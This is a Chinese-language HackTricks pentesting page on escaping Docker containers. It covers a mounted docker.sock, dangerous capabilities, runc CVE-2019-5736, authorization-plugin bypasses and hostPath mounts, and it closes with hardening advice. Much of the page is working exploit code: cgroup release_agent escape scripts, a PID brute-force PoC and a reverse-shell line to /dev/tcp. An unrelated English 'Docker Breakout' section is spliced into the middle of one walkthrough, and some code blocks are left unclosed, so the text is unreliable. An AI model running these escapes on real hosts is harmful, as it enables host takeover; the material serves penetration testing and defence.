<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 什么是容器

简而言之，容器是通过**cgroups**（进程可以使用的资源，如CPU和RAM）和**namespaces**（进程可以看到的内容，如目录或其他进程）进行**隔离**的**进程**：
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# 挂载的Docker套接字

如果你发现**Docker套接字被挂载**在Docker容器内部，你将能够从中逃脱出来。\
这通常发生在需要连接到Docker守护程序执行操作的Docker容器中。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
在这种情况下，您可以使用常规的docker命令与docker守护程序进行通信：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
如果**docker套接字位于意外位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与其通信。
{% endhint %}

# 容器权限提升

您应该检查容器的权限，如果具有以下任何权限之一，您可能能够从中逃脱：**`CAP_SYS_ADMIN`**，**`CAP_SYS_PTRACE`**，**`CAP_SYS_MODULE`**，**`DAC_READ_SEARCH`**，**`DAC_OVERRIDE`**

您可以使用以下命令检查当前容器的权限：
```bash
capsh --print
```
在下面的页面中，您可以了解有关Linux功能的更多信息以及如何滥用它们：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged`标志

`--privileged`标志允许容器访问主机设备。

## 我拥有Root权限

配置良好的Docker容器不会允许执行像**fdisk -l**这样的命令。然而，在错误配置的Docker命令中指定了`--privileged`标志时，可以获得查看主机驱动器的特权。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

因此，要接管主机机器是微不足道的：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
然后，你现在可以访问主机的文件系统，因为它被挂载在`/mnt/hola`文件夹中。

{% code title="初始 PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% code title="第二个 PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged`标志引入了重大的安全问题，并且利用该漏洞需要启用该标志来启动一个docker容器。使用此标志时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux权限的限制。

实际上，`--privileged`提供的权限远远超出了通过此方法逃逸docker容器所需的权限。实际上，“只有”以下要求：

1. 我们必须在容器内作为root用户运行
2. 容器必须以`SYS_ADMIN` Linux权限运行
3. 容器必须缺少AppArmor配置文件，或者允许`mount`系统调用
4. 在容器内必须以读写方式挂载cgroup v1虚拟文件系统

`SYS_ADMIN`权限允许容器执行`mount`系统调用（参见[man 7 capabilities](https://linux.die.net/man/7/capabilities)）。[Docker默认以受限的权限启动容器](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)，并且不启用`SYS_ADMIN`权限，因为这样做存在安全风险。

此外，Docker默认使用`docker-default` AppArmor策略启动容器，即使容器以`SYS_ADMIN`权限运行，也[禁止使用`mount`系统调用](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。

如果以`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`标志运行容器，则容器将容易受到此技术的攻击。

## 分解概念验证

现在我们了解了使用此技术的要求，并且已经完善了概念验证漏洞，让我们逐行解释它，以演示其工作原理。

要触发此漏洞利用，我们需要一个cgroup，我们可以在其中创建一个`release_agent`文件，并通过杀死cgroup中的所有进程来触发`release_agent`调用。最简单的方法是挂载一个cgroup控制器并创建一个子cgroup。

为此，我们创建一个`/tmp/cgrp`目录，挂载[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup控制器，并创建一个子cgroup（在本示例中命名为“x”）。虽然没有测试每个cgroup控制器，但这种技术应该适用于大多数cgroup控制器。

如果您正在跟随并出现“mount: /tmp/cgrp: special device cgroup does not exist”错误，那是因为您的设置没有RDMA cgroup控制器。将`rdma`更改为`memory`以修复它。我们使用RDMA是因为原始概念验证仅设计用于与其一起使用。

请注意，cgroup控制器是全局资源，可以多次以不同的权限进行挂载，并且在一个挂载中进行的更改将应用于另一个挂载。

我们可以看到下面的“x”子cgroup的创建及其目录列表。
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
接下来，我们通过向其`notify_on_release`文件写入1来在释放“x” cgroup时启用cgroup通知。我们还通过将主机上的`release_agent`文件写入`/cmd`脚本的路径来设置RDMA cgroup的释放代理——我们稍后将在容器中创建该脚本。为此，我们将从`/etc/mtab`文件中获取容器在主机上的路径。

我们在容器中添加或修改的文件存在于主机上，并且可以从两个世界（容器中的路径和主机上的路径）对它们进行修改。

这些操作如下所示：
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
请注意我们将在主机上创建的 `/cmd` 脚本的路径：
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
现在，我们创建`/cmd`脚本，使其执行`ps aux`命令，并将其输出保存到容器中的`/output`文件中，通过指定主机上输出文件的完整路径。最后，我们还打印`/cmd`脚本以查看其内容：
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
最后，我们可以通过在“x”子cgroup目录中生成一个立即结束的进程来执行攻击。通过创建一个`/bin/sh`进程并将其PID写入“x”子cgroup目录中的`cgroup.procs`文件，主机上的脚本将在`/bin/sh`退出后执行。然后，主机上执行的`ps aux`命令的输出将保存到容器内的`/output`文件中：
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged`标志 v2

之前的 PoC 在容器配置了一个存储驱动程序时可以正常工作，该驱动程序会公开挂载点的完整主机路径，例如 `overlayfs`，然而最近我遇到了一些配置，它们并没有明显地公开主机文件系统的挂载点。

## Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) 默认情况下通过 `9pfs` 挂载容器的根文件系统。这不会泄露有关 Kata Containers 虚拟机中容器文件系统位置的任何信息。

\* 关于 Kata Containers 的更多信息将在未来的博客文章中提到。

## 设备映射器
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
我在一个实时环境中看到了一个具有根挂载的容器，我相信该容器是使用特定的`devicemapper`存储驱动程序配置运行的，但是到目前为止，我无法在测试环境中复制这种行为。

## 另一种 PoC

显然，在这些情况下，没有足够的信息来确定容器文件在主机文件系统上的路径，因此无法直接使用 Felix 的 PoC。然而，我们仍然可以通过一些巧妙的方法执行这次攻击。

唯一需要的关键信息是相对于容器主机的完整路径，用于在容器内执行的文件。如果无法从容器内的挂载点中确定这一点，我们必须寻找其他地方。

### 救命的 Proc <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

Linux 的 `/proc` 伪文件系统公开了系统上运行的所有进程的内核进程数据结构，包括在不同命名空间中运行的进程，例如容器内部的进程。可以通过在容器中运行命令并访问主机上的进程的 `/proc` 目录来展示这一点：
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_顺便提一下，`/proc/<pid>/root` 数据结构曾经让我困惑了很长时间，我一直无法理解为什么将符号链接指向 `/` 是有用的，直到我在 man 手册中读到了实际的定义：_

> /proc/\[pid]/root
>
> UNIX 和 Linux 支持每个进程的文件系统根目录的概念，通过 chroot(2) 系统调用进行设置。该文件是一个符号链接，指向进程的根目录，并且与 exe 和 fd/\* 的行为相同。
>
> 但请注意，该文件不仅仅是一个符号链接。它提供了与进程本身相同的文件系统视图（包括命名空间和每个进程的挂载点集）。

`/proc/<pid>/root` 符号链接可以用作容器内任何文件的主机相对路径：Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
这将攻击的要求从知道容器内文件相对于容器主机的完整路径，变为知道容器中任何进程的pid。

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

这实际上是容易的部分，Linux中的进程ID是数字，并按顺序分配。`init`进程被分配进程ID `1`，所有后续进程都被分配递增的ID。为了确定容器内进程的主机进程ID，可以使用暴力递增搜索：Container
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
主机

---

### Docker Breakout

#### Introduction

Docker is a popular containerization platform that allows you to run applications in isolated environments called containers. However, misconfigurations or vulnerabilities in Docker can lead to privilege escalation attacks, allowing an attacker to break out of the container and gain access to the underlying host system.

This section will cover various techniques that can be used to break out of a Docker container and escalate privileges on the host system.

#### Docker Socket

The Docker daemon communicates with the Docker client through a Unix socket, which is typically located at `/var/run/docker.sock`. By default, this socket is owned by the `root` user and the `docker` group. If an attacker gains access to this socket, they can execute Docker commands with root privileges.

To exploit this, an attacker can mount the host's Docker socket inside a container and then use it to interact with the Docker daemon. This can be done by running the container with the following command:

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock <image>
```

Once inside the container, the attacker can execute privileged Docker commands, such as creating new containers or even starting a new container with host-level privileges.

#### Container Escape

In some cases, it may be possible to escape the confines of a Docker container and gain access to the host system. This can be achieved through various techniques, such as exploiting kernel vulnerabilities or misconfigurations in the container runtime.

One common technique is to mount the host's root filesystem inside the container and then modify critical system files to gain root access on the host. This can be done by running the container with the following command:

```bash
docker run -v /:/host <image>
```

Once inside the container, the attacker can navigate to the `/host` directory and modify system files as needed.

#### Privilege Escalation

Once an attacker has gained access to the host system, they can escalate their privileges to gain full control over the system. This can be done by exploiting vulnerabilities in the host's operating system or by leveraging misconfigurations in system services.

Common privilege escalation techniques include exploiting weak file permissions, misconfigured sudo privileges, or vulnerable setuid binaries. By exploiting these vulnerabilities, an attacker can gain root access on the host system and perform any actions they desire.

#### Conclusion

Docker breakout attacks can be a serious security risk if Docker is not properly configured or if vulnerabilities are present in the host system. It is important to follow security best practices when using Docker and regularly update both the Docker software and the host system to mitigate these risks.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### 将所有内容整合在一起 <a href="putting-it-all-together" id="putting-it-all-together"></a>

为了完成这次攻击，可以使用暴力破解技术来猜测路径`/proc/<pid>/root/payload.sh`的pid，每次迭代将猜测的pid路径写入cgroups的`release_agent`文件，触发`release_agent`，并查看是否创建了输出文件。

这种技术的唯一注意事项是它绝对不是一个隐蔽的方法，并且可能会使pid计数非常高。由于没有长时间运行的进程保持运行，这 _应该_ 不会导致可靠性问题，但请不要引用我。

下面的PoC实现了这些技术，提供了一个比Felix原始PoC中使用cgroups `release_agent`功能逃逸特权容器更通用的攻击方法：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
在具有特权的容器中执行PoC应该会提供类似的输出：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc漏洞利用（CVE-2019-5736）

如果你能以root身份执行`docker exec`（可能需要sudo），你可以尝试通过滥用CVE-2019-5736（漏洞[在这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）来提升权限并从容器中逃脱。这种技术基本上会从容器中**覆盖**主机的_**/bin/sh**_二进制文件，因此任何执行docker exec的人都可能触发有效载荷。

根据需要修改有效载荷，并使用`go build main.go`构建main.go。生成的二进制文件应放置在docker容器中以供执行。\
执行时，一旦显示`[+] Overwritten /bin/sh successfully`，你需要从主机机器上执行以下操作：

`docker exec -it <container-name> /bin/sh`

这将触发main.go文件中的有效载荷。

了解更多信息：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Docker身份验证插件绕过

在某些情况下，系统管理员可能会安装一些插件到docker中，以防止低权限用户在没有能力提升权限的情况下与docker进行交互。

## 禁止`run --privileged`

在这种情况下，系统管理员**禁止用户使用`--privileged`标志挂载卷和运行容器**，或者给容器赋予任何额外的权限：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
然而，用户可以在运行的容器内创建一个shell，并赋予它额外的权限：
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
现在，用户可以使用之前讨论过的任何技术逃离容器，并在主机内提升权限。

## 挂载可写文件夹

在这种情况下，系统管理员**禁止用户使用`--privileged`标志运行容器**或为容器提供任何额外的能力，并且只允许挂载`/tmp`文件夹：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
请注意，您可能无法挂载`/tmp`文件夹，但可以挂载**其他可写文件夹**。您可以使用以下命令查找可写目录：`find / -writable -type d 2>/dev/null`

**请注意，并非Linux机器上的所有目录都支持suid位！**为了检查哪些目录支持suid位，请运行`mount | grep -v "nosuid"`。例如，通常`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`和`/var/lib/lxcfs`不支持suid位。

还要注意，如果您可以**挂载`/etc`**或任何其他**包含配置文件**的文件夹，您可以作为root用户从docker容器中更改它们，以便在主机上**滥用它们**并提升权限（可能修改`/etc/shadow`）。
{% endhint %}

## 未经检查的JSON结构

当系统管理员配置docker防火墙时，可能会**忘记一些重要的API参数**（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)），比如“**Binds**”。\
在下面的示例中，可以利用这个配置错误创建和运行一个容器，该容器挂载了主机的根（/）文件夹：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## 未检查的JSON属性

有可能当系统管理员配置Docker防火墙时，**忘记了API的某个参数的一些重要属性**（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)），比如在“**HostConfig**”中的“**Capabilities**”。在下面的示例中，可以利用这个配置错误来创建和运行一个具有**SYS_MODULE**能力的容器：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# 可写的 hostPath 挂载

（来自[**这里**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)的信息）在容器内部，攻击者可以尝试通过集群创建的可写 hostPath 卷来进一步访问底层主机操作系统。以下是您可以在容器内部检查的一些常见事项，以查看是否可以利用此攻击向量：
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# 容器安全改进

## Docker中的Seccomp

这不是一个从Docker容器中突破的技术，而是Docker使用的一种安全功能，你应该了解它，因为它可能会阻止你从Docker中突破出来：

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## Docker中的AppArmor

这不是一个从Docker容器中突破的技术，而是Docker使用的一种安全功能，你应该了解它，因为它可能会阻止你从Docker中突破出来：

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## 认证和授权

授权插件根据当前的身份验证上下文和命令上下文来**批准**或**拒绝**对Docker守护程序的请求。身份验证上下文包含所有用户详细信息和身份验证方法。命令上下文包含所有相关的请求数据。

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor**是一个用Go语言编写的应用内核，它实现了Linux系统的大部分功能。它包括一个名为`runsc`的[Open Container Initiative (OCI)](https://www.opencontainers.org)运行时，提供了应用程序和主机内核之间的**隔离边界**。`runsc`运行时与Docker和Kubernetes集成，使得运行沙盒容器变得简单。

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers**是一个开源社区，致力于构建一个安全的容器运行时，使用轻量级虚拟机，感觉和性能与容器相似，但通过硬件虚拟化技术提供了更强大的工作负载隔离作为第二层防御。

{% embed url="https://katacontainers.io/" %}

## 安全使用容器

Docker默认限制和限制容器。放宽这些限制可能会导致安全问题，即使没有使用`--privileged`标志的全部权限。重要的是要认识到每个额外权限的影响，并将权限总体限制在最低限度。

为了保持容器的安全性：

* 不要使用`--privileged`标志或在容器内挂载[Docker套接字](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)。Docker套接字允许生成容器，因此通过使用`--privileged`标志运行另一个容器是控制主机的简单方法。
* 不要在容器内以root身份运行。使用[不同的用户](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)或[用户命名空间](https://docs.docker.com/engine/security/userns-remap/)。容器中的root与主机上的root相同，除非使用用户命名空间重新映射。它仅受到Linux命名空间、能力和cgroups的轻微限制。
* [丢弃所有能力](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)(`--cap-drop=all`)，仅启用所需的能力(`--cap-add=...`)。许多工作负载不需要任何能力，添加能力会增加潜在攻击的范围。
* [使用“no-new-privileges”安全选项](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)防止进程通过suid二进制文件获得更多权限。
* [限制容器可用的资源](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)。资源限制可以保护机器免受拒绝服务攻击。
* 调整[seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（或SELinux）配置文件，将容器可用的操作和系统调用限制为最低限度。
* 使用[官方的Docker镜像](https://docs.docker.com/docker-hub/official_images/)或基于它们构建自己的镜像。不要继承或使用[后门](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)镜像。
* 定期重建镜像以应用安全补丁。这是不言而喻的。

# 参考资料

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得最新版本的PEASS或下载PDF格式的HackTricks吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品**The PEASS Family**。

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)。

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
